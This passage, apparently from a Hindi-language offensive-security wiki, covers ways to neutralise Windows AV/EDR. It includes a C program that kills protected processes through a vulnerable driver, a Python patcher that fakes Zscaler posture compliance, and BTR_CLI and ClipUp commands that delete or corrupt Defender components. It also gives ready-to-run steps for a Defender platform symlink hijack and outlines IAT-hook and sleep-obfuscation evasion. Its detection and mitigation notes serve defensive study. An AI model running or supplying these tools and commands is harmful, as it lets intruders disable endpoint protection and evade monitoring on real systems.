   ```
   पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, ताकि `\\.\ServiceMouse` user land से accessible हो जाए।
3. **driver द्वारा exposed IOCTLs**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID के ज़रिए किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए इस्तेमाल किया जाता है) |
   | `0x990000D0` | disk पर किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह छोड़ देता है; kernel में execute होने वाला code *protected* processes को खोल सकता है, उन्हें terminate कर सकता है, या PPL/PP, ELAM अथवा अन्य hardening features की परवाह किए बिना kernel objects के साथ छेड़छाड़ कर सकता है।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से मना कर दे।
•  नई *kernel* services बनने पर निगरानी रखें और alert दें, जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
•  custom device objects के लिए user-mode handles और उसके बाद होने वाली संदिग्ध `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के ज़रिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को स्थानीय रूप से लागू करता है और नतीजों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। Design के दो कमज़ोर विकल्प पूर्ण bypass को संभव बनाते हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**Disk पर चार signed binaries को patch करके** इन दोनों mechanisms को निष्क्रिय किया जा सकता है:

| Binary | Patch किया गया मूल logic | परिणाम |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी (बिना signed process भी) RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदल दिया जाता है |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuit किए जाते हैं |

Minimal patcher excerpt:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

* मूल फ़ाइलों को बदलने और service stack को फिर से शुरू करने के बाद:

* **सभी** posture checks हरे/अनुपालक दिखते हैं।
* Unsigned या संशोधित binaries named-pipe RPC endpoints खोल सकते हैं (जैसे, `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* compromised host को Zscaler policies द्वारा परिभाषित internal network तक बिना किसी प्रतिबंध के पहुंच मिल जाती है।

यह case study दिखाता है कि केवल client-side trust decisions और साधारण signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` की trusted-functionality का दुरुपयोग

Defender का **Boot-Time Removal** driver, पारंपरिक BYOVD का एक उपयोगी प्रतिवाद है। `BTR.sys` एक वैध Microsoft-signed remediation component है, जिसमें memory-corruption bug या IOCTL interface नहीं है; administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसके बजाय इसके private remediation transaction को forge कर सकता है और इच्छित Ring-0 file/registry operations हासिल कर सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और इस driver को किसी स्पष्ट third-party driver को लाने के बजाय target के अपने `MpEngine.dll` के `BOOTTIMETOOL` resource से निकाला जा सकता है।<sup>[[36]](#references)</sup>

### one-shot driver को staging करना

Defender आमतौर पर resource को random `[a-z]{8}.sys` file के रूप में निकालता है और इसी तरह नाम वाली kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, संदर्भित NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds में एक निश्चित 256-byte key का पुनः उपयोग होता है, इसलिए encryption कोई authorization boundary नहीं है। एक मान्य plaintext में 24-byte global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload से निकली transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और किसी भी संख्या में items होते हैं। हर item में 16-byte header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) और action-विशिष्ट data होता है, जिसका अंत **ठीक चार NUL bytes** से होता है। हर header/data region की स्वतंत्र रूप से CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF` और **बिना final XOR** (`~CRC32`) से जाँच की जाती है; हर region के लिए CRC state reset किया जाता है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकृत action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | परिणाम |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी file को delete करना, locked file सहित |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | file को attacker द्वारा चुने गए protected path में move करना; खाली destination का अर्थ delete करना है |
| 4 | `[Flags][key path]` | registry key को recursively delete करना |
| 5 | `[Flags][key path + "\\" + value]` | registry value delete करना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | registry value बनाना/अपडेट करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, on-wire key/value separator **लगातार दो backslashes** होता है; सामान्य तरीके से लिखा गया path सही ढंग से split नहीं होगा। Feedback file अधिकतर request की हूबहू नकल करती है, लेकिन हर item के पहले चार data bytes उसका परिणामी `NTSTATUS` बन जाते हैं। Actions 1 और 2 में, जिनमें आगे कोई flags field नहीं होती, BTR status के लिए जगह बनाने हेतु path को चार reserved trailing bytes में shift करता है।<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow और early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` निकालना, `<random>.sys:changelist` और एक feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, सीधे service registry key बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए उसे system-start driver के रूप में छोड़ देना। सीधे registry staging से सामान्य SCM `CreateServiceW` path बच जाता है और इसलिए service-install Event ID 7045 उत्पन्न **नहीं** होता। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है, क्योंकि BTR, storage stack और `SystemRoot` link तैयार होने से पहले `DriverEntry` से file I/O करता है। इसके बजाय `Start=1` और high-priority `Boot Bus Extender` group का उपयोग करने पर यह Phase 1 में चलता है: NTFS उपयोग योग्य होता है, लेकिन कई system-start security drivers और user-mode EDR services अभी initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले से loaded हो सकते हैं, फिर भी BTR अगली startup से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा उन्हें launch किए जाने से पहले service executables मिटा सकता है। ELAM इस अंतर को बंद नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास valid Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक transaction में कई actions चलते हैं। PoC, hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 को सबसे पहले जोड़ता है: BTR यह log बनाता है, फिर अपना delete request पूरा करके unload होने से पहले इसे हटा देता है। इससे सबूत कम होते हैं, जबकि feedback को `<random>.sys:<random>.dat` में रखने पर driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### उच्च-संकेत पहचान सहसंबंध

केवल signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की इच्छित functionality के दुरुपयोग को संबोधित नहीं करते। इन behavioral correlations को प्राथमिकता दें और वैध Defender lineage को किसी मनमाने launcher से अलग पहचानें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS विशेष रूप से संदिग्ध है, क्योंकि वैध Defender आमतौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के नीचे रखता है।
- **Sysmon 12/13 बिना System 7045 के:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` की सीधी creation को correlate करें, जिसमें `Args=...:changelist` और `Group=Boot Bus Extender` हो, लेकिन उससे मेल खाने वाला SCM installation event न हो।
- **Sysmon 6 -> 23:** ज्ञात BTR driver का non-Defender lineage से load होना और उसके बाद `System`/PID 4 के नाम से file deletion होना correlate करें, विशेषकर security binaries के लिए।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेजी से create और delete करने पर alert करें।
- `SeLoadDriverPrivilege` देने और सक्षम करने को सीमित करें और audit करें; जब `cmd.exe`, PowerShell या कोई अज्ञात process security-tool driver को stage करे, तो केवल Microsoft signature पर्याप्त भरोसे का आधार नहीं है।

## PPL का दुरुपयोग करके LOLBINs से AV/EDR में छेड़छाड़

Protected Process Light (PPL) signer/level की hierarchy लागू करता है, ताकि केवल समान या उच्चतर protected processes ही एक-दूसरे से छेड़छाड़ कर सकें। Offensive रूप से, यदि आप वैध तरीके से PPL-enabled binary launch कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो logging जैसी benign functionality को AV/EDR द्वारा उपयोग की जाने वाली protected directories के विरुद्ध सीमित, PPL-समर्थित write primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL के रूप में process चलाने के लिए
- Target EXE (और उसमें load होने वाली सभी DLLs) पर PPL-capable EKU से signature होना चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- Binary के signer से मेल खाने वाला compatible protection level मांगा जाना चाहिए (जैसे, anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels होने पर creation विफल हो जाएगी।

PP/PPL और LSASS protection का व्यापक परिचय यहां देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और target EXE को arguments देता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का पैटर्न:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` खुद को spawn करता है और caller द्वारा निर्दिष्ट path पर log file लिखने के लिए एक parameter स्वीकार करता है।
- PPL process के रूप में launch किए जाने पर, file write PPL backing के साथ होता है।
- ClipUp ऐसे paths parse नहीं कर सकता जिनमें spaces हों; सामान्यतः protected locations को target करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची देखें: हर parent directory में `dir /x` चलाएँ।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launcher (जैसे, CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-capable LOLBIN (ClipUp) launch करें।
2) किसी protected AV directory (जैसे, Defender Platform) में file बनवाने के लिए ClipUp का log-path argument दें। ज़रूरत पड़ने पर 8.3 short names का उपयोग करें।
3) अगर AV चलने के दौरान target binary सामान्यतः open/locked रहती है (जैसे, MsMpEng.exe), तो AV शुरू होने से पहले boot पर write शेड्यूल करें। इसके लिए ऐसा auto-start service install करें जो भरोसेमंद तरीके से पहले चलती हो। Process Monitor (boot logging) से boot ordering की पुष्टि करें।
4) Reboot पर PPL-backed write, AV द्वारा उसकी binaries को lock करने से पहले होती है, जिससे target file corrupt हो जाती है और startup रुक जाता है।

Example invocation (paths redacted/shortened for safety):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

नोट्स और सीमाएँ
- ClipUp क्या लिखता है, इसकी सामग्री को आप नियंत्रित नहीं कर सकते; यह primitive सटीक content injection के बजाय corruption के लिए उपयुक्त है।
- सेवा install/start करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

पता लगाने के तरीके
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` का process creation, खासकर जब इसका parent कोई non-standard launcher हो।
- Auto-start के लिए configure की गई नई services, जो संदिग्ध binaries चलाती हों और लगातार Defender/AV से पहले शुरू होती हों। Defender startup failures से पहले हुई service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा PPL level के असामान्य उपयोग पर नज़र रखें।

Mitigations
- WDAC/Code Integrity: PPL के रूप में चल सकने वाली signed binaries और उनके parent processes को सीमित करें; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services के creation/modification को सीमित करें और start-order manipulation पर नज़र रखें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के अनुकूल हो, तो security tooling वाली volumes पर 8.3 short-name generation बंद करने पर विचार करें (अच्छी तरह test करें)।

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender यह तय करता है कि वह किस platform से चलेगा, इसके लिए वह इन subfolders की सूची बनाता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला subfolder चुनता है (उदा., `4.18.25070.5-0`), फिर वहीं से Defender service processes शुरू करता है (service/registry paths को उसी के अनुसार अपडेट करते हुए)। यह selection directory entries पर भरोसा करता है, जिनमें directory reparse points (symlinks) भी शामिल हैं। एक administrator इसका लाभ उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption कर सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के अंदर directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform को फिर से चुनने के लिए trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools आवश्यक हैं (`mklink`)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और यह जाँच किए बिना कि target किसी protected/trusted path पर resolve होता है या नहीं, lexicographically सबसे ऊँचा version चुनता है।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर इंगित करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger चयन (reboot की अनुशंसा की जाती है):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) रीडायरेक्ट किए गए path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाली service configuration/registry दिखनी चाहिए।

Post-exploitation विकल्प
- DLL sideloading/code execution: Defender द्वारा अपनी application directory से लोड की जाने वाली DLLs को code execute करने के लिए drop/replace करें, ताकि Defender की processes में code execute हो। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink हटाएँ, ताकि अगली बार start होने पर configured path resolve न हो और Defender start होने में विफल हो:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह technique अपने आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से हटाकर सीधे target module में ले जा सकती हैं। इसके लिए वे उसके Import Address Table (IAT) को hook करके चुने हुए APIs को attacker-controlled, position-independent code (PIC) के ज़रिए route करती हैं। इससे evasion उन कुछ APIs से आगे तक सामान्यीकृत हो जाती है जिन्हें कई kits उपलब्ध कराते हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post-exploitation DLLs तक भी पहुँचती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (prepended या companion) का उपयोग करके target module के साथ PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL लोड होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को देखें और लक्षित imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) की IAT entries को thin PIC wrappers पर point करने के लिए patch करें।
- हर PIC wrapper, असली API address को tail-call करने से पहले evasions चलाता है। सामान्य evasions में शामिल हैं:
  - Call के दौरान memory को mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis में अपेक्षित frames resolve हों।<sup>[[9]](#references)</sup>
- Compatibility के लिए ऐसा interface export करें जिससे Aggressor script (या equivalent) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

यहाँ IAT hooking क्यों
- Hook किए गए import का उपयोग करने वाले किसी भी code के साथ काम करता है; tool code में बदलाव करने या विशिष्ट APIs को proxy करने के लिए Beacon पर निर्भर रहने की ज़रूरत नहीं।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनकी API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call-stack–आधारित detections के विरुद्ध process-spawning post-ex commands का भरोसेमंद उपयोग बहाल करता है।

न्यूनतम IAT hook रूपरेखा (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- Patch को relocations/ASLR के बाद और import के पहले उपयोग से पहले लागू करें। TitanLdr/AceLdr जैसे reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- Wrappers को छोटा और PIC-safe रखें; असली API को patching से पहले कैप्चर की गई original IAT value या LdrGetProcedureAddress के जरिए resolve करें।
- PIC के लिए RW → RX transitions का इस्तेमाल करें और writable+executable pages न छोड़ें।

Call-stack spoofing stub
- Draugr-शैली के PIC stubs एक fake call chain बनाते हैं (benign modules के return addresses के साथ), फिर असली API पर pivot करते हैं।
- इससे वे detections विफल होते हैं जो संवेदनशील APIs तक पहुंचने वाले Beacon/BOFs के canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले expected frames के अंदर पहुंचने के लिए stack cutting/stack stitching techniques के साथ इसका इस्तेमाल करें।

Operational integration
- Reflective loader को post-ex DLLs के आगे रखें, ताकि DLL लोड होते ही PIC और hooks अपने-आप initialize हो जाएं।
- Target APIs register करने के लिए Aggressor script का इस्तेमाल करें, ताकि Beacon और BOFs को code changes के बिना पारदर्शी रूप से उसी evasion path का लाभ मिले।

Detection/DFIR से जुड़ी बातें
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve हों; import pointers का समय-समय पर verification।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित न हों; non-image PIC पर अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को बदलने वाली शुरुआती DllMain activity, load के समय बनाए गए अप्रत्याशित RX regions।
- Image-load evasion: अगर LoadLibrary* को hook किया गया है, तो memory masking events से संबंधित automation/clr assemblies के संदिग्ध loads पर नज़र रखें।

संबंधित building blocks और उदाहरण
- ऐसे reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO के जरिए import-time IAT hooks

अगर आपका reflective loader पर नियंत्रण है, तो `ProcessImports()` के **दौरान** loader के `GetProcAddress` pointer को एक custom resolver से बदलकर imports को hook कर सकते हैं। यह resolver पहले hooks की जांच करता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएं, जो transient loader PIC के खुद को free करने के बाद भी बना रहे।
- `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (जैसे, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup इस्तेमाल करें। अगर hook मौजूद हो, तो उसे return करें; अन्यथा असली `GetProcAddress` को call करें।
- Crystal Palace के `addhook "MODULE$Func" "hook"` entries के जरिए link time पर hook targets register करें। Hook मान्य रहता है, क्योंकि वह resident PICO के अंदर होता है।

इससे loaded DLL के code section को load के बाद patch किए बिना **import-time IAT redirection** संभव होता है।

### जब target PEB-walking का इस्तेमाल करता हो, तब hookable imports सुनिश्चित करना

Import-time hooks तभी trigger होते हैं, जब function वास्तव में target की IAT में हो। अगर कोई module PEB-walk + hash के जरिए APIs resolve करता है (और कोई import entry नहीं होती), तो असली import जोड़ें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve किए जाने पर interception संभव होता है।

### `Sleep()` को patch किए बिना Ekko-शैली का sleep/idle obfuscation

`Sleep` को patch करने के बजाय, implant द्वारा इस्तेमाल किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। लंबे waits के लिए, call को Ekko-शैली की obfuscation chain में wrap करें, जो idle के दौरान in-memory image को encrypt करती है:<sup>[[31]](#references)[[27]](#references)</sup>

- Callbacks का एक क्रम schedule करने के लिए `CreateTimerQueueTimer` का इस्तेमाल करें; ये callbacks crafted `CONTEXT` frames के साथ `NtContinue` call करते हैं।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर सेट करें → पूरी mapped image पर `advapi32!SystemFunction032` के जरिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections पर चलकर **हर section की permissions बहाल करें** → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; इसे कई frames में clone करें और हर step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) सेट करें।

Operational detail: लंबे waits (जैसे, `WAIT_OBJECT_0`) के लिए “success” return करें, ताकि image masked रहने के दौरान caller आगे बढ़ता रहे। यह तरीका idle windows के दौरान module को scanners से छिपाता है और classic “patched `Sleep()`” signature से बचता है।

Detection के विचार (telemetry-आधारित)
- `NtContinue` की ओर point करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- बड़े, लगातार image-sized buffers पर `advapi32!SystemFunction032` का इस्तेमाल।
- बड़े-range का `VirtualProtect`, जिसके बाद custom per-section permission restoration हो।

### Sleep-obfuscation gadgets के लिए runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आम तौर पर `STATUS_STACK_BUFFER_OVERRUN` के साथ process को crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes में Ekko/Kraken-शैली की chains को चालू रखने के लिए:<sup>[[30]](#references)</sup>

- Chain में इस्तेमाल किए जाने वाले हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के जरिए register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर के addresses के लिए, `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **पूरे image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए, इसके बजाय **allocation base** और allocation size का इस्तेमाल करें।
- सिर्फ dispatch gadget ही नहीं, बल्कि indirectly पहुंचे जाने वाले exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और attacker-controlled executable sections को भी mark करें, जो indirect targets बनेंगे।

इससे ROP/JOP-शैली की sleep chains “सिर्फ non-CFG processes में काम करती हैं” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compile किए गए अन्य endpoints के लिए reusable primitive बन जाती हैं।

### Sleeping threads के लिए CET-safe stack spoofing

पूरी `CONTEXT` replacement शोर पैदा करती है और CET Shadow Stack systems पर विफल हो सकती है, क्योंकि spoofed `Rip` को hardware shadow stack से मेल खाना चाहिए। Sleep-masking का एक सुरक्षित तरीका:<sup>[[30]](#references)</sup>

- उसी process में कोई दूसरा thread चुनें और `NtQueryInformationThread` के जरिए उसकी `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- मौजूदा thread का असली TEB/TIB backup करें।
- `GetThreadContext` से असली sleeping context capture करें।
- Spoof context में **सिर्फ** असली `Rip` copy करें; spoofed `Rsp`/stack state को जस का तस छोड़ें।
- Sleep window के दौरान spoof thread का `NT_TIB` मौजूदा TEB में copy करें, ताकि stack walkers एक legitimate stack range के अंदर unwind करें।
- Wait खत्म होने के बाद, original TIB और thread context restore करें।

इससे CET-संगत instruction pointer बना रहता है, जबकि उन EDR stack walkers को गुमराह किया जाता है जो unwinds validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-आधारित विकल्प: Kraken Mask

अगर timer-queue dispatch बहुत आसानी से पहचाना जा सकता हो, तो वही sleep-encrypt-spoof-restore sequence queued APCs का इस्तेमाल करके suspended helper thread से execute किया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाला helper thread बनाएं।
- `NtQueueApcThread` से तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack को exhaust होने से बचाने के लिए chain state को helper stack के बजाय heap पर रखें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का इस्तेमाल करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि वह race window कम हो जिसमें scanner को आधी-restored stack दिख सकती है।

इससे वही RC4 masking और stack-spoofing लक्ष्य बनाए रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature इस्तेमाल होती है।

अतिरिक्त detection के विचार
- Sleeps, waits या APC dispatch से कुछ समय पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory`।
